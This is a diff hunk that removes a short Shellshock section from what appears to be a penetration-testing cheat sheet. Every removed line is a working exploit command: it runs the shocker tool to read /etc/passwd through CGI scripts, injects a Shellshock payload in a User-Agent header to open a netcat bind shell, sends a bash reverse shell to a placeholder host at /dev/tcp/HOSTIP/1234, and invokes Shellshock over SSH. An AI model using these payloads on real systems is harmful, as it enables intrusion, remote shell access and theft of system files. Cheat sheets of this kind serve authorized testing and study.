@@ -1,9 +1,0 @@
-> The following tool will test it.
-* git clone https://github.com/nccgroup/shocker; cd shocker; ./shocker.py -H $ip  --command "/bin/cat /etc/passwd" -c /cgi-bin/status --verbose;  ./shocker.py -H $ip  --command "/bin/cat /etc/passwd" -c /cgi-bin/admin.cgi --verbose
-
-> You can also:
-* echo -e "HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; /usr/bin/nc -l -p 9999 -e /bin/sh\r\nHost: vulnerable\r\nConnection: close\r\n\r\n" | nc $ip 80
-* curl -x TARGETADDRESS -H "User-Agent: () { ignored;};/bin/bash -i >& /dev/tcp/HOSTIP/1234 0>&1" $ip/cgi-bin/status
-
-> Shellshock over SSH:
-* ssh username@$ip '() { :;}; /bin/bash'
